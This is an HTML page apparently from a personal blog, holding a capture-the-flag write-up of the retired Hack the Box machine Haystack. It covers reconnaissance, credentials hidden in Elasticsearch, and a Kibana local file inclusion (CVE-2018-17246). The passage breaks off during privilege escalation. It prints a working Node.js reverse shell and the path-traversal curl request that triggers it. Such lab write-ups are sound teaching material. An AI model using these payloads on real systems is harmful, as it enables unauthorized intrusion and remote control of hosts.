@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.ico>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Ryan Kozak - Hack the Box Haystack Writeup</title>
+<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Haystack&#32;Writeup />
+<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Haystack&#32;Writeup />
+<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Haystack&#32;Writeup />
+<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Haystack&#32;Writeup />
+<meta property="og:site_name" content="Ryan Kozak" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="http://localhost:1313/posts/hack-the-box-haystack-writeup/" />
+<link rel="canonical" href="http://localhost:1313/posts/hack-the-box-haystack-writeup/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/hack-the-box-haystack-writeup/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/hack-the-box-haystack-writeup/" />
+<meta property="og:url" content="http://localhost:1313/posts/hack-the-box-haystack-writeup/" />
+
+
+<meta property="og:updated_time" content="2019-11-02T18:31:46-07:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="Ryan Kozak" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.3">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="http://localhost:1313/">
+                <img src="/images/d0n601.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="http://localhost:1313/">
+                <h1>Ryan Kozak</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Hacking, web development, $other
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-armageddon-writeup/">Hack the Box Armageddon Writeup</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-ophiuchi-writeup/">Hack the Box Ophiuchi Writeup</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/luks-encrypted-arch-linux-on-pinebook-pro-again/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/luks-encrypted-arch-linux-on-pinebook-pro/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-traceback-writeup/">Hack the Box Traceback Writeup</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://whodis@ryankozak.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+
+
+        <p class="footnote">
+    &copy; 2024 Ryan Kozak. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/hack-the-box-haystack-writeup/">Hack the Box Haystack Writeup</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2019-11-02T18:31:46-0700" class="post-date">
+        November 2, 2019
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>6 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><img src="/posts/images/hack-the-box-haystack-writeup/badge.png" alt="Hack The Box Haystack"></p>
+<h1 id="intro">Intro</h1>
+<p>Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn&rsquo;t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren&rsquo;t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.</p>
+<h1 id="information-gathering">Information Gathering</h1>
+<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
+<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC 10.10.10.115
+</span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.115
+</span></span><span style="display:flex;"><span>Host is up (0.38s latency).
+</span></span><span style="display:flex;"><span>Not shown: 997 filtered ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+</span></span><span style="display:flex;"><span>|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.12.2
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.12.2
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span style="display:flex;"><span>9200/tcp open  http    nginx 1.12.2
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: DELETE
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.12.2
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8).
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
+</span></span></code></pre></div><p>Ports open <strong>22</strong>, <strong>80</strong>, and <strong>9200</strong>.</p>
+<h2 id="the-needle-port-80">The Needle: Port 80</h2>
+<p>We see that there&rsquo;s an Nginix page hosting only an image. This is a CTF after all, so let&rsquo;s check and see if there&rsquo;s anything hidden in this picture.</p>
+<p><img src="/posts/images/hack-the-box-haystack-writeup/port80.png" alt="Port 80">
+<strong>Figure 1:</strong> needle.jpg displayed on port 80.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# strings -10 needle.jpg
+</span></span><span style="display:flex;"><span>paint.net 4.1.1
+</span></span><span style="display:flex;"><span>%&amp;<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">()</span>*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+</span></span><span style="display:flex;"><span>&amp;&#39;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+</span></span><span style="display:flex;"><span>&gt;S<span style="color:#f92672">)</span>T;M7<span style="color:#ae81ff">\{</span>Y
+</span></span><span style="display:flex;"><span>WEL/;wg-J3
+</span></span><span style="display:flex;"><span>T.-UWuvFG,
+</span></span><span style="display:flex;"><span>Euw!i$goRk
+</span></span><span style="display:flex;"><span>5)5=FI$b[=+
+</span></span><span style="display:flex;"><span>*Oo!;.o|?&gt;
+</span></span><span style="display:flex;"><span>bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+</span></span><span style="display:flex;"><span>root@kali:~/Desktop# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 --decode
+</span></span><span style="display:flex;"><span>la aguja en el pajar es &#34;clave&#34;
+</span></span></code></pre></div><p>We see that there is a <code>base64</code> encoded string in this <code>.jpg</code>. When we decode that we get the following message.</p>
+<blockquote>
+<p>la aguja en el pajar es &ldquo;clave&rdquo;</p>
+</blockquote>
+<p>Translated to English this becomes,</p>
+<blockquote>
+<p>the needle in the haystack is &ldquo;key&rdquo;</p>
+</blockquote>
+<h2 id="they-haystack-port-9200-elasticsearch">They Haystack: Port 9200 (Elasticsearch)</h2>
+<p>The Elasticsearch database is where the haystack resides. When it&rsquo;s queried we see that it&rsquo;s version <code>6.4.2</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.115:9200
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  &#34;name&#34; : &#34;iQEYHgS&#34;,
+</span></span><span style="display:flex;"><span>  &#34;cluster_name&#34; : &#34;elasticsearch&#34;,
+</span></span><span style="display:flex;"><span>  &#34;cluster_uuid&#34; : &#34;pjrX7V_gSFmJY-DxP4tCQg&#34;,
+</span></span><span style="display:flex;"><span>  &#34;version&#34; : {
+</span></span><span style="display:flex;"><span>    &#34;number&#34; : &#34;6.4.2&#34;,
+</span></span><span style="display:flex;"><span>    &#34;build_flavor&#34; : &#34;default&#34;,
+</span></span><span style="display:flex;"><span>    &#34;build_type&#34; : &#34;rpm&#34;,C
+</span></span><span style="display:flex;"><span>    &#34;build_hash&#34; : &#34;04711c2&#34;,
+</span></span><span style="display:flex;"><span>    &#34;build_date&#34; : &#34;2018-09-26T13:34:09.098244Z&#34;,
+</span></span><span style="display:flex;"><span>    &#34;build_snapshot&#34; : false,
+</span></span><span style="display:flex;"><span>    &#34;lucene_version&#34; : &#34;7.4.0&#34;,
+</span></span><span style="display:flex;"><span>    &#34;minimum_wire_compatibility_version&#34; : &#34;5.6.0&#34;,
+</span></span><span style="display:flex;"><span>    &#34;minimum_index_compatibility_version&#34; : &#34;5.0.0&#34;
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  &#34;tagline&#34; : &#34;You Know, for Search&#34;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This version should have a local file inclusion vulnerability <code>CVE-2018-17246</code>, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for <code>key</code>, nothing comes up. Using Spanish though, and making the query for <code>clave</code>, it returns some interesting records.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# curl -X GET &#34;http://10.10.10.115:9200/_search?q=clave&#34;
+</span></span><span style="display:flex;"><span>{&#34;took&#34;:23,&#34;timed_out&#34;:false,&#34;_shards&#34;:{&#34;total&#34;:11,&#34;successful&#34;:11,&#34;skipped&#34;:0,&#34;failed&#34;:0},&#34;hits&#34;:{&#34;total&#34;:2,&#34;max_score&#34;:5.9335938,&#34;hits&#34;:[{&#34;_index&#34;:&#34;quotes&#34;,&#34;_type&#34;:&#34;quote&#34;,&#34;_id&#34;:&#34;45&#34;,&#34;_score&#34;:5.9335938,&#34;_source&#34;:{&#34;quote&#34;:&#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &#34;}},{&#34;_index&#34;:&#34;quotes&#34;,&#34;_type&#34;:&#34;quote&#34;,&#34;_id&#34;:&#34;111&#34;,&#34;_score&#34;:5.3459888,&#34;_source&#34;:{&#34;quote&#34;:&#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&#34;}}]}}
+</span></span></code></pre></div><p>Let&rsquo;s decode these two base64 strings and see what they&rsquo;re saying.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# echo dXNlcjogc2VjdXJpdHkg | base64 --decode
+</span></span><span style="display:flex;"><span>user: security
+</span></span><span style="display:flex;"><span>root@kali:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 --decode
+</span></span><span style="display:flex;"><span>pass: spanish.is.key
+</span></span></code></pre></div><p>Now we have a user name and some credentials.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="user-flag">User Flag</h2>
+<p>Using the credentials found in the Elasticsearch database we&rsquo;re able to ssh into the box and gain the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack ~]$ cat user.txt
+</span></span><span style="display:flex;"><span>04d18bc79dac1d4d48ee0a940c8eb929
+</span></span></code></pre></div><h2 id="root-flag">Root Flag</h2>
+<p>It may be intuitive that we&rsquo;re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.</p>
+<p><code>[security@haystack tmp]$ ps -elf|grep root</code></p>
+<p><img src="/posts/images/hack-the-box-haystack-writeup/elk_is_root.png" alt="ELK is root">
+<strong>Figure 2:</strong> Logstash is running as root.</p>
+<p>It&rsquo;s now clear to us that <code>logstash</code>, which is the <code>L</code> in <code>ELK</code>, is running as root. When we attempt to view the current configuration files for <code>logstash</code> we see that the <code>security</code> user we currently have a shell as isn&rsquo;t able to read them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack conf.d]$ pwd
+</span></span><span style="display:flex;"><span>/etc/logstash/conf.d
+</span></span><span style="display:flex;"><span>[security@haystack conf.d]$ ls -la
+</span></span><span style="display:flex;"><span>total 12
+</span></span><span style="display:flex;"><span>drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
+</span></span><span style="display:flex;"><span>[security@haystack conf.d]$ cat filter.conf
+</span></span><span style="display:flex;"><span>cat: filter.conf: Permission denied
+</span></span></code></pre></div><h3 id="pivot-to-kibana-user">Pivot to kibana user</h3>
+<p>Researching known vulnerabilities in Elasticsearch <code>6.4.2</code>, we&rsquo;ve come across <a href="https://github.com/mpgn/CVE-2018-17246" target="_blank">CVE-2018-17246</a>. The Github user <a href="https://github.com/mpgn" target="_blank">mpgn</a> has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user <code>kibana</code>, and do more with <code>logstash</code> than we currently have permission to do.</p>
+<p>The javascript reverse shell code provided is as follows. All that&rsquo;s needed for this to work out of the box is replacing our IP and port that netcat is listening on.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, []);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Socket</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#ae81ff">4444</span>, <span style="color:#e6db74">&#34;10.10.14.19&#34;</span>, <span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdin</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/a/</span>; <span style="color:#75715e">// Prevents the Node.js application form crashing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>})();
+</span></span></code></pre></div><p>We place the shell code into a directory to which we have access as the <code>security</code> user. In this case we place the shell into <code>/dev/shm</code>, and name it <code>mahshell.js</code>.</p>
+<p>We are able to determine that <code>kibana</code> is running locally on port <code>5601</code> by reading the <code>/etc/kibana/kibana.yml</code> file.</p>
+<p><img src="/posts/images/hack-the-box-haystack-writeup/kibana_yml.png" alt="kibana yml">
+<strong>Figure 3:</strong> kibana.yml</p>
+<p>We can make the following <code>curl</code> request to execute our reverse shell code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[security@haystack shm]$ curl -X GET <span style="color:#e6db74">&#34;localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/mahshell.js&#34;</span> -H <span style="color:#e6db74">&#34;kbn-xsrf: true&#34;</span>
+</span></span></code></pre></div><p><img src="/posts/images/hack-the-box-haystack-writeup/kibana_user.png" alt="kibana user">
+<strong>Figure 4</strong>: Shell as kibana user.</p>
+<p>Now that we are the user <code>kibana</code>, we go back to the configuration files under <code>/etc/logstash/conf.d</code> and check out what <code>filter.conf</code> contains.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>bash-4.2$ cd /etc/logstash/conf.d
+</span></span><span style="display:flex;"><span>cd /etc/logstash/conf.d
